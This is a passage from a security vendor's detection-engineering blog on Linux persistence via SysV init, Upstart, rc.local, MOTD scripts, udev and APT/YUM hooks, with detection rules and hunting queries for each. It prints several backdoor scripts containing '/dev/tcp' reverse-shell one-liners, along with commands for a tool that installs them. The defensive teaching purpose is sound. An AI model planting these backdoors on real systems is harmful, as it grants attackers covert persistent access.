series](https://search.elastic.co/?q=Linux%20Detection%20Engineering\u0026location%5B0%5D=Security%20Labs\u0026author%5B0%5D=Ruben%20Groenewoud), we’ll dive deeper into the world of Linux persistence. We start with common or straightforward methods and move towards more complex or obscure techniques. The goal remains the same: to educate defenders and security researchers on the foundational aspects of Linux persistence by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.\n\nIn the previous article - \"Linux Detection Engineering - a primer on persistence mechanisms\" - we explored the foundational aspects of Linux persistence techniques. If you missed it, you can find it [here](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).\n\nWe'll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we’re sharing [PANIX](https://github.com/Aegrah/PANIX), a Linux persistence tool that Ruben Groenewoud of Elastic Security developed. PANIX simplifies and customizes persistence setup to test potential detection opportunities.\n\nBy the end of this series, you'll have gained a comprehensive understanding of each of the persistence mechanisms that we covered, including:\n\n* How it works (theory)\n* How to set it up (practice)\n* How to detect it (SIEM and Endpoint rules)\n* How to hunt for it (ES|QL and OSQuery reference hunts)\n\nLet’s go beyond the basics and dig a little bit deeper into the world of Linux persistence, it’s fun!\n\n## Setup note\n\nTo ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to [enable and update our pre-built detection rules](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill in any gaps. Now, we are ready to get started. \n\n## T1037 - boot or logon initialization scripts: Init\n\nInit, short for \"initialization,\" is the first process started by the kernel during the boot process on Unix-like operating systems. It continues running until the system is shut down. The primary role of an init system is to start, stop, and manage system processes and services.\n\nThere are three major init implementations - [Systemd](https://man7.org/linux/man-pages/man1/systemd.1.html), [System V](https://linux.die.net/man/8/service), and [Upstart](https://linux.die.net/man/7/upstart). In [part 1](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms) of this series, we focused on Systemd. In this part, we will explore System V and Upstart. MITRE does not have specific categories for System V or Upstart. These are generally part of [T1037](https://attack.mitre.org/techniques/T1037/).\n\n### T1037 - boot or logon initialization scripts: System V init\n\n[System V (SysV) init](https://linux.die.net/man/8/service) is one of the oldest and most traditional init systems. SysV init scripts are gradually being replaced by modern init systems like Systemd. However, `systemd-sysv-generator` allows Systemd to handle traditional SysV init scripts, ensuring older services and applications can still be managed within the newer framework.\n\nThe `/etc/init.d/` directory is a key component of the SysV init system. It is responsible for controlling the startup, running, and shutdown of services on a system. Scripts in this directory are executed at different run levels to manage various system services. Despite the rise of Systemd as the default init system in many modern Linux distributions, `init.d` scripts are still widely used and supported, making them a viable option for persistence.\n\nThe scripts in `init.d` are used to start, stop, and manage services. These scripts are executed with root privileges, providing a powerful means for both administrators and attackers to ensure certain commands or services run on boot. These scripts are often linked to [runlevel](https://linux.die.net/man/7/runlevel) directories like `/etc/rc0.d/`, `/etc/rc1.d/`, etc., which determine when the scripts are run. Runlevels, ranging from 0 to 6, define specific operational states, each configuring different services and processes to manage system behavior and user interactions. Runlevels vary depending on the distribution, but generally look like the following:\n\n* 0: Shutdown\n* 1: Single User Mode\n* 2: Multiuser mode without networking\n* 3: Multiuser mode with networking\n* 4: Unused\n* 5: Multiuser mode with networking and GUI\n* 6: Reboot\n\nDuring system startup, scripts are executed based on the current runlevel configuration. Each script must follow a specific structure, including `start`, `stop`, `restart`, and `status` commands to manage the associated service. Scripts prefixed with `S` (start) or `K` (kill) dictate actions during startup or shutdown, respectively, ordered by their numerical sequence.\n\nAn [example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1864-L1881) of a malicious `init.d` script might look similar to the following:\n\n```\n#! /bin/sh\n### BEGIN INIT INFO\n# Provides:             malicious-sysv-script\n# Required-Start:       $remote_fs $syslog\n# Required-Stop:        $remote_fs $syslog\n# Default-Start:        2 3 4 5\n# Default-Stop:         0 1 6\n### END INIT INFO\n\ncase \"$1\" in\n  start)\n    echo \"Starting malicious-sysv-script\"\n    nohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\n    ;;\nesac\n```\n\nThe script must be placed in the `/etc/init.d/` directory and be granted execution permissions. Similarly to Systemd services, SysV scripts must also be enabled. A common utility to manage SysV configurations is `update-rc.d`. It allows administrators to enable or disable services and manage the symbolic links (start and kill scripts) in the `/etc/rc*.d/` directories, automatically setting the correct runlevels based on the configuration of the script.\n\n```\nsudo update-rc.d malicious-sysv-script defaults\n```\n\nThe `malicious-sysv-script` is now enabled and ready to run on boot. MITRE specifies more information and real-world examples related to this technique in [T1037](https://attack.mitre.org/techniques/T1037/).\n\n#### Persistence through T1037 - System V init\n\nYou can manually set up a test script within the `/etc/init.d/` directory, grant it execution permissions, enable it, and reboot it, or simply use [PANIX](https://github.com/aegrah/PANIX). PANIX is a Linux persistence tool that simplifies and customizes persistence setup for testing your detections. We can use it to establish persistence simply by running:\n\n```\n\u003e sudo ./panix.sh --initd --default --ip 192.168.1.1 --port 2006\n\u003e [+] init.d backdoor established with IP 192.168.1.1 and port 2006.\n```\n\nPrior to rebooting and actually establishing persistence, we can see the following documents being generated in Discover:\n\n![Events generated as a result of System V init persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image14.png \"Events generated as a result of System V init persistence establishment\")\n\nAfter executing PANIX, it generates a SysV init script named `/etc/init.d/ssh-procps`, applies executable permissions using `chmod +x`, and utilizes `update-rc.d`. This command triggers `systemctl daemon-reload`, which, in turn, activates the `systemd-sysv-generator` to enable `ssh-procps` during system boot.\n\nLet’s reboot the system and look at the events that are generated on shutdown/boot.\n\n![Events generated as a result of System V init persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image8.png \"Events generated as a result of System V init persistence establishment\")\n\nAs the SysV init system is loaded early, the start command is not logged. Since it is impossible to detect an event before events are being ingested, we need to be creative in detecting this technique. Elastic will capture `already_running` event actions for service initialization events. Through this chain we are capable of detecting the execution of the service, followed by the reverse shell that was initiated. We have several detection opportunities for this persistence technique.\n\n| Category | Coverage                                                     |\n|----------|--------------------------------------------------------------|\n| File     | [System V Init Script Created](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_init_d_file_creation.toml)                                 |\n|          | [Suspicious File Creation in /etc for Persistence](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml)             |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)                  |\n| Process  | [System V Init (init.d) Executed Binary from Unusual Location](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_executed_binary_from_unusual_location.toml) |\n|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml)          |\n| Network  | [System V Init (init.d) Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_egress_network_connection.toml)             |\n\n\n\n#### Hunting for T1037 - System V init\n\nOther than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This blog will solely list the available hunts for each persistence mechanism; however, more details regarding this topic are outlined at the end of the first section in [the previous article on persistence](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms). Additionally, descriptions and references can be found in our [Detection Rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting).\n\nWe can hunt for System V Init persistence through [ES|QL](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) and [OSQuery](https://www.elastic.co/guide/en/kibana/current/osquery.html), focusing on unusual process executions and file creations. The [Persistence via System V Init](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_sysv_init.toml) rule contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.\n\n### T1037 - boot or logon initialization scripts: Upstart\n\n[Upstart](https://linux.die.net/man/7/upstart) was introduced as an alternative init system designed to improve boot performance and manage system services more dynamically than traditional SysV init. While it has been largely supplanted by systemd in many Linux distributions, Upstart is still used in some older releases and legacy systems.\n\nThe core of Upstart's configuration resides in the `/etc/init/` directory, where job configuration files define how services are started, stopped, and managed. Each job file specifies dependencies, start conditions, and actions to be taken upon start, stop, and other events.\n\nIn Upstart, run levels are replaced with events and tasks, which define the sequence and conditions under which jobs are executed. Upstart introduces a more event-driven model, allowing services to start based on various system events rather than predefined run levels.\n\nUpstart can run system-wide or in user-session mode. While system-wide configurations are placed in the `/etc/init/` directory, user-session mode configurations are located in:\n\n* `~/.config/upstart/`\n* `~/.init/`\n* `/etc/xdg/upstart/`\n* `/usr/share/upstart/sessions/`\n\nAn example of an Upstart job file can look like this:\n\n```\ndescription \"Malicious Upstart Job\"\nauthor \"Ruben Groenewoud\"\n\nstart on runlevel [2345]\nstop on shutdown\n\nexec nohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\n```\n\nThe `malicious-upstart-job.conf` file defines a job that starts on run levels 2, 3, 4, and 5 (general Linux access and networking), and stops on run levels 0, 1, and 6 (shutdown/reboot). The `exec` line executes the malicious payload to establish a reverse shell connection when the system boots up.\n\nTo enable the Upstart job and ensure it runs on boot, the job file must be placed in `/etc/init/` and given appropriate permissions. Upstart jobs are automatically recognized and managed by the `Upstart init daemon`.\n\nUpstart was deprecated a long time ago, with Linux distributions such as Debian 7 and Ubuntu 16.04 being the final systems that leverage Upstart by default. These systems moved to the SysV init system, removing compatibility with Upstart altogether. Based on the data in our [support matrix](https://www.elastic.co/support/matrix), only the Elastic Agent in Beta version supports some of these old operating systems, and the recent version of Elastic Defend does not run on them at all. These systems have been EOL for years and should not be used in production environments anymore.\n\nBecause of this reason, we added support/coverage for this technique to the [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml) detection rule. If you are still running these systems in production, using, for example, old versions of [Auditbeat](https://www.elastic.co/beats/auditbeat) to gather its logs, you can set up [Auditbeat file creation](https://www.elastic.co/guide/en/beats/auditbeat/current/configuration-auditbeat.html) and [FIM](https://www.elastic.co/docs/current/integrations/fim) file modification rules in the `/etc/init/` directory, similar to the techniques mentioned in the [previous blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms), and in the sections yet to come. Similarly to System V Init, information and real-world examples related to this technique are specified by MITRE in [T1037](https://attack.mitre.org/techniques/T1037/).\n\n## T1037.004 - boot or logon initialization scripts: run control (RC) scripts\n\nThe [rc.local](https://man.freebsd.org/cgi/man.cgi?rc.local) script is a traditional method for executing commands or scripts on Unix-like operating systems during system boot. It is located at `/etc/rc.local` and is typically used to start services, configure networking, or perform other system initialization tasks that do not warrant a full init script. In Darwin-based systems and very few other Unix-like systems, `/etc/rc.common` is used for the same purpose. \n\nNewer versions of Linux distributions have phased out the `/etc/rc.local` file in favor of Systemd for handling initialization scripts. Systemd provides compatibility through the [systemd-rc-local-generator](https://man7.org/linux/man-pages/man8/systemd-rc-local-generator.8.html) generator; this executable ensures backward compatibility by checking if `/etc/rc.local` exists and is executable. If it meets these criteria, it integrates the `rc-local.service` unit into the boot process. Therefore, as long as this generator is included in the Systemd setup, `/etc/rc.local` scripts will execute during system boot. In RHEL derivatives, `/etc/rc.d/rc.local` must be granted execution permissions for this technique to work. \n\nThe `rc.local` script is a shell script that contains commands or scripts to be executed once at the end of the system boot process, after all other system services have been started. This makes it useful for tasks that require specific system conditions to be met before execution. Here’s an example of how a simple backdoored `rc.local` script might look:\n\n```\n#!/bin/sh\n/bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\nexit 0\n```\n\nThe command above creates a reverse shell by opening a bash session that redirects input and output to a specified IP address and port, allowing remote access to the system.\n\nTo ensure `rc.local` runs during boot, the script must be marked executable. On the next boot, the `systemd-rc-local-generator` will create the necessary symlink in order to enable the `rc-local.service` and execute the `rc.local` script. RC scripts did receive their own sub-technique by MITRE. More information and examples of real-world usage of RC Scripts for persistence can be found in [T1037.004](https://attack.mitre.org/techniques/T1037/004/).\n\n### Persistence through T1037.004 - run control (RC) scripts\n\nAs long as the `systemd-rc-local-generator` is present, establishing persistence through this technique is simple. Create the `/etc/rc.local` file, add your payload, and mark it as executable. We will leverage the following PANIX command to establish it for us.\n\n```\n\u003e sudo ./panix.sh --rc-local --default --ip 192.168.1.1 --port 2007\n\u003e [+] rc.local backdoor established \n```\n\nAfter rebooting the system, we can see the following events being generated:\n\n![Events generated as a result of RC Script persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image6.png \"Events generated as a result of RC Script persistence establishment\")\n\nThe same issue as before arises. We see the execution of PANIX, creating the `/etc/rc.local` file and granting it execution permissions. When running `systemctl daemon-reload`, we can see the `systemd-rc-local-generator` creating a symlink in the `/run/systemd/generator[.early|late]` directories. \n\nSimilar to the previous example in which we ran into this issue, we can again use the `already_running` `event.action` documents to get some information on the executions. Digging into this, one method that detects potential traces of `rc.local` execution is to search for documents containing `/etc/rc.local start` entries:\n\n![Events generated as a result of rc.local service status](/assets/images/sequel-on-persistence-mechanisms/image7.png \"Events generated as a result of rc.local service status\")\n\nWhere we see `/etc/rc.local` being started, after which a suspicious command is executed. The `/opt/bds_elf` is a rootkit, leveraging `rc.local` as a persistence method. \n\nAdditionally, we can leverage the [syslog](https://man7.org/linux/man-pages/man3/syslog.3.html) data source, as this file is parsed on initialization of the system integration. You can set up [Filebeat](https://www.elastic.co/beats/filebeat) or the [Elastic Agent](https://www.elastic.co/elastic-agent) with the [System integration](https://www.elastic.co/docs/current/en/integrations/system) to harvest syslog. When looking at potential errors in its execution logs, we can detect other traces of `rc.local` execution events for both our testing and rootkit executions:\n\n![Events generated as a result of /etc/rc.local syslog error messages](/assets/images/sequel-on-persistence-mechanisms/image4.png \"Events generated as a result of /etc/rc.local syslog error messages\")\n\nBecause of the challenges in detecting these persistence mechanisms, it is very important to catch traces as early in the chain as possible. Leveraging a multi-layered defense strategy increases the chances of detecting techniques like these.\n\n| Category | Coverage                                            |\n|----------|-----------------------------------------------------|\n| File     | [rc.local/rc.common File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_script_creation.toml)                    |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)         |\n| Process  | [Potential Execution of rc.local Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_service_already_running.toml)              |\n|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml) |\n| Syslog   | [Suspicious rc.local Error Message](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_error_via_syslog.toml)                   |\n\n### Hunting for T1037.004 - run control (RC) scripts\n\nSimilar to the System V Init detection opportunity limitations, this technique deals with the same limitations due to timing. Thus, hunting for RC Script persistence is important. We can hunt for this technique by looking at `/etc/rc.local` file creations and/or modifications and the existence of the `rc-local.service` systemd unit/startup item. The [Persistence via rc.local/rc.common](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_rc_local.toml) rule contains several ES|QL and OSQuery queries that aid in hunting for this technique. \n\n## T1037 - boot or logon initialization scripts: Message of the Day (MOTD)\n\n[Message of the Day (MOTD)](https://linux.die.net/man/5/motd) is a feature that displays a message to users when they log in via SSH or a local terminal. To display messages before and after the login process, Linux uses the `/etc/issue` and the `/etc/motd` files. These messages display on the command line and will not be seen before and after a graphical login. The `/etc/issue` file is typically used to display a login message or banner, while the `/etc/motd` file generally displays issues, security policies, or messages. These messages are global and will display to all users at the command line prompt. Only a privileged user (such as root) can edit these files.\n\nIn addition to the static `/etc/motd` file, modern systems often use dynamic MOTD scripts stored in `/etc/update-motd.d/`. These scripts generate dynamic content that can be included in the MOTD, such as current system metrics, weather updates, or news headlines.\n\nThese dynamic scripts are shell scripts that execute shell commands. It is possible to create a new file within this directory or to add a backdoor to an existing one. Once the script has been granted execution permissions, it will execute every time a user logs in.\n\nRHEL derivatives do not make use of dynamic MOTD scripts in a similar way as Debian does, and are not susceptible to this technique. \n\nAn example of a backdoored `/etc/update-motd.d/` file could look like this:\n\n```\n#!/bin/sh\nnohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\n```\n\nLike before, MITRE does not have a specific technique related to this. Therefore we classify this technique as [T1037](https://attack.mitre.org/techniques/T1037/).\n\n### Persistence through T1037 - message of the day (MOTD)\n\nA [payload](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1644-L1669) similar to the one presented above should be used to ensure the backdoor does not interrupt the SSH login, potentially triggering the user’s attention. We can leverage PANIX to set up persistence on Debian-based systems through MOTD like so:\n\n```\n \u003e sudo ./panix.sh --motd --default --ip 192.168.1.1 --port 2008\n\u003e [+] MOTD backdoor established in /etc/update-motd.d/137-python-upgrades\n```\n\nTo trigger the backdoor, we can reconnect to the server via SSH or reconnect to the terminal.\n\n![Events generated as a result of Message of the Day (MOTD) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image2.png \"Events generated as a result of Message of the Day (MOTD) persistence establishment\")\n\nIn the image above we can see PANIX being executed, which creates the `/etc/update-motd.d/137-python-upgrades` file and marks it as executable. Next, when a user connects to SSH/console, the payload is executed, resulting in an egress network connection by the root user. This is a straightforward attack chain, and we have several layers of detections for this:\n\n| Category | Coverage                                             |\n|----------|------------------------------------------------------|\n| File     | [Message-of-the-Day (MOTD) File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_message_of_the_day_creation.tom)              |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)          |\n| Process  | [Process Spawned from Message-of-the-Day (MOTD)](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_process_spawned_from_motd_detected.toml)       |\n|          | [Suspicious Message Of The Day Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_message_of_the_day_execution.toml)              |\n|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml)  |\n| Network  | [MOTD Execution Followed by Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_motd_execution_followed_by_egress_network_connection.toml) |\n|          | [Egress Network Connection by MOTD Child](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_network_connection_by_motd_child.toml)              |\n\n### Hunting for T1037 - message of the day (MOTD)\n\nHunting for MOTD persistence can be conducted through ES|QL and OSQuery. We can do so by analyzing file creations in these directories and executions from MOTD parent processes. We created the [Persistence via Message-of-the-Day](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_message_of_the_day.toml) rule aid in this endeavor.\n\n## T1546 - event triggered execution: udev\n\n[Udev](https://man7.org/linux/man-pages/man7/udev.7.html) is the device manager for the Linux kernel, responsible for managing device nodes in the `/dev` directory. It dynamically creates or removes device nodes, manages permissions, and handles various events triggered by device state changes. Essentially, Udev acts as an intermediary between the kernel and user space, ensuring that the operating system appropriately handles hardware changes.\n\nWhen a new device is added to the system (such as a USB drive, keyboard, or network interface), Udev detects this event and applies predefined rules to manage the device. Each rule consists of key-value pairs that match device attributes and actions to be performed. Udev rules files are processed in lexical order, and rules can match various device attributes, including device type, kernel name, and more. Udev rules are defined in text files within a default set of directories:\n\n* `/etc/udev/rules.d/`\n* `/run/udev/rules.d/`\n* `/usr/lib/udev/rules.d/`\n* `/usr/local/lib/udev/rules.d/`\n* `/lib/udev/`\n\nPriority is measured based on the source directory of the rule file and takes precedence based on the order listed above (`/etc/` → `/run/` → `/usr/`). When a rule matches, it can trigger a wide range of actions, including executing arbitrary commands or scripts. This flexibility makes Udev a potential vector for persistence by malicious actors. An example Udev rule looks like the following:\n\n```\nSUBSYSTEM==\"block\", ACTION==\"add|change\", ENV{DM_NAME}==\"ubuntu--vg-ubuntu--lv\", SYMLINK+=\"disk/by-dname/ubuntu--vg-ubuntu--lv\"\n```\n\nTo leverage this method for persistence, root privileges are required. Once a rule file is created, the rules need to be reloaded.\n\n```\nsudo udevadm control --reload-rules\n```\n\nTo test the rule, either perform the action specified in the rule file or use the [udevadm](https://www.man7.org/linux/man-pages/man8/udevadm.8.html) trigger utility.\n\n```\nsudo udevadm trigger -v\n```\n\nAdditionally, these drivers can be monitored using `udevadm`, by running:\n\n```\nudevadm monitor --environment\n```\n\nEder’s [blog](https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/) titled “Leveraging Linux udev for persistence” is a very good read for more information on this topic. This technique has several limitations, making it more difficult to leverage the persistence mechanism.\n\n* Udev rules are limited to short foreground tasks due to potential blocking of subsequent events.\n* They cannot execute programs accessing networks or filesystems, enforced by `systemd-udevd.service`'s sandbox.\n* Long-running processes are terminated after event handling.\n\nDespite these restrictions, bypasses include creating detached processes outside udev rules for executing implants, such as:\n\n* Leveraging `at`/`cron`/`systemd` for independent scheduling.\n* Injecting code into existing processes.\n\nAlthough persistence would be set up through a different technique than udev, udev would still grant a persistence mechanism for the `at`/`cron`/`systemd` persistence mechanism. MITRE does not have a technique dedicated to this mechanism — the most logical technique to add this to would be [T1546](https://attack.mitre.org/techniques/T1546/).\n\nResearchers from AON recently discovered a malware called \"sedexp\" that achieves persistence using Udev rules - a technique rarely seen in the wild - so be sure to check out [their research article](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp).\n\n## Persistence through T1546 - udev\n\nPANIX allows you to test all three techniques by leveraging `--at`, `--cron` and `--systemd`, respectively. Or go ahead and test it manually. We can set up udev persistence through `at`, by running the following command:\n\n```\n\u003e sudo ./panix.sh --udev --default --ip 192.168.1.1 --port 2009 --at\n```\n\nTo trigger the payload, you can either run `sudo udevadm trigger` or reboot the system. Let’s analyze the events in Discover.\n\n![Events generated as a result of Udev At persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image16.png \"Events generated as a result of Udev At persistence establishment\")\n\nIn the figure above, PANIX is executed, which creates the `/usr/bin/atest` backdoor and grants it execution permissions. Subsequently, the `10-atest.rules` file is generated, and the drivers are reloaded and triggered. This causes `At` to be spawned as a child process of `udevadm`, creating the `atspool`/`atjob`, and subsequently executing the reverse shell.\n\nCron follows a similar structure; however, it is slightly more difficult to catch the malicious activity, as the child process of `udevadm` is `bash`, which is not unusual.\n\n![Events generated as a result of Udev Cron persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image5.png \"Events generated as a result of Udev Cron persistence establishment\")\n\nFinally, when looking at the documents generated by Udev in combination with Systemd, we see the following:\n\n![Events generated as a result of Udev Systemd persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image9.png \"Events generated as a result of Udev Systemd persistence establishment\")\n\nWhich also does not show a relationship with udev, other than the `12-systemdtest.rules` file that is created. \n\nThis leads these last two mechanisms to be detected through our previous systemd/cron related rules, rather than specific udev rules. Let’s take a look at the coverage (We omitted the `systemd`/`cron` rules, as these were already mentioned in [the previous persistence blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)):\n\n| Category | Coverage                                             |\n|----------|------------------------------------------------------|\n| File     | [Systemd-udevd Rule File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_udev_rule_creation.toml)                     |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)          |\n| Process  | [At Utility Launched through Udevadm](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_at_utility_launched_through_udevadm.toml)                  |\n|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml)  |\n| Network  | [Udev Execution Followed by Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_udev_execution_followed_by_egress_network_connection.toml) |\n\n### Hunting for T1546 - udev\n\nHunting for Udev persistence can be conducted through ES|QL and OSQuery. By leveraging ES|QL, we can detect unusual file creations and process executions, and through OSQuery we can do live hunting on our managed systems. To get you started, we created the [Persistence via Udev](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_udev.toml) rule, containing several different queries.\n\n## T1546.016 - event triggered execution: installer packages\n\nPackage managers are tools responsible for installing, updating, and managing software packages. Three widely used package managers are [APT](https://linux.die.net/man/8/apt) (Advanced Package Tool), [YUM](https://man7.org/linux/man-pages/man8/yum.8.html) (Yellowdog Updater, Modified), and YUM’s successor, [DNF](https://man7.org/linux/man-pages/man8/dnf.8.html) (Danified YUM). Beyond their legitimate uses, these tools can be leveraged by attackers to establish persistence on a system by hijacking the package manager execution flow, ensuring malicious code is executed during routine package management operations. MITRE details information related to this technique under the identifier [T1546.016](https://attack.mitre.org/techniques/T1546/016/).\n\n### T1546.016 - installer packages (APT)\n\n[APT](https://linux.die.net/man/8/apt) is the default package manager for Debian-based Linux distributions like Debian, Ubuntu, and their derivatives. It simplifies the process of managing software packages and dependencies. APT utilizes several configuration mechanisms to customize its behavior and enhance package management efficiency. \n\n[APT hooks](https://manpages.debian.org/testing/apt/apt.conf.5.en.html) allow users to execute scripts or commands at specific points during package installation, removal, or upgrade operations. These hooks are stored in `/etc/apt/apt.conf.d/` and can be leveraged to execute actions pre- and post-installation. The structure of APT configuration files follows a numeric ordering convention to control the application of configuration snippets that customize various aspects of APT's behavior. A regular APT hook looks like this:\n\n```\nDPkg::Post-Invoke {\"if [ -d /var/lib/update-notifier ]; then touch /var/lib/update-notifier/dpkg-run-stamp; fi; /usr/lib/update-notifier/update-motd-updates-available 2\u003e/dev/null || true\";};                                                                            APT::Update::Post-Invoke-Success {\"/usr/lib/update-notifier/update-motd-updates-available 2\u003e/dev/null || true\";}; \n```\n\nThese configuration files can be exploited by attackers to execute malicious binaries or code whenever an APT operation is executed. This vulnerability extends to automated processes like auto-updates, enabling persistent execution on systems with automatic update features enabled.\n\n#### Persistence through T1546.016 - installer packages (APT)\n\nTo test this method, a Debian-based system that leverages APT or the manual installation of APT is required. Make sure that if you perform this step manually, that you do not break the APT package manager, as [a carefully crafted payload](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2021C4-L2021C138) that detaches and runs in the background is necessary to not interrupt the execution chain. You can setup APT persistence by running:\n\n```\n\u003e sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --apt\n\u003e [+] APT persistence established\n```\n\nTo trigger the payload, run an APT command, such as `sudo apt update`. This will spawn a reverse shell. Let’s take a look at the events in Discover:\n\n![Events generated as a result of package manager (APT) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image10.png \"Events generated as a result of package manager (APT) persistence establishment\")\n\nIn the figure above, we see PANIX being executed, creating the `01python-upgrades` file, and successfully establishing the APT hook. After running `sudo apt update`, APT reads the configuration file and executes the payload, initiating the `sh` → `nohup` → `setsid` → `bash` reverse shell chain. Our coverage is multi-layered, and detects the following events:\n\n| Category | Coverage                                          |\n|----------|---------------------------------------------------|\n| File     | [APT Package Manager Configuration File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_file_creation.toml)   |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)       |\n| Process  | [Suspicious APT Package Manager Execution](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_execution.toml)          |\n|          | [APT Package Manager Command Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_command_execution.toml)             |\n| Network  | [Suspicious APT Package Manager Network Connection](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_netcon.toml) |\n|          | [APT Package Manager Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_egress_network_connection.toml)     |\n\n### T1546.016 - installer packages (YUM)\n\n[YUM](https://man7.org/linux/man-pages/man8/yum.8.html) (Yellowdog Updater, Modified) is the default package management system used in Red Hat-based Linux distributions like CentOS and Fedora. YUM employs [plugin architecture](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins) to extend its functionality, allowing users to integrate custom scripts or programs that execute at various stages of the package management lifecycle. These plugins are stored in specific directories and can perform actions such as logging, security checks, or custom package handling.\n\nThe structure of YUM plugins typically involves placing them in directories like:\n\n* `/etc/yum/pluginconf.d/` (for configuration files)\n* `/usr/lib/yum-plugins/` (for plugin scripts)\n\nFor plugins to be enabled, the `/etc/yum.conf` file must have the `plugins=1` set. These plugins can intercept YUM operations, modify package installation behaviors, or execute additional actions before or after package transactions. YUM plugins are quite extensive, but a basic YUM plugin template might look like [this](http://yum.baseurl.org/wiki/WritingYumPlugins.html):\n\n```\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\n\nrequires_api_version = '2.3'\nplugin_type = (TYPE_CORE, TYPE_INTERACTIVE)\n\ndef init_hook(conduit):\n    conduit.info(2, 'Hello world')\n\ndef postreposetup_hook(conduit):\n    raise PluginYumExit('Goodbye')\n```\n\nEach plugin must be enabled through a `.conf` configuration file:\n\n```\n[main]                                                                                                                               enabled=1\n```\n\nSimilar to APT's configuration files, YUM plugins can be leveraged by attackers to execute malicious code during routine package management operations, particularly during automated processes like system updates, thereby establishing persistence on vulnerable systems.\n\n#### Persistence through T1546.016 - Installer Packages (YUM)\n\nSimilar to APT, YUM plugins should be crafted 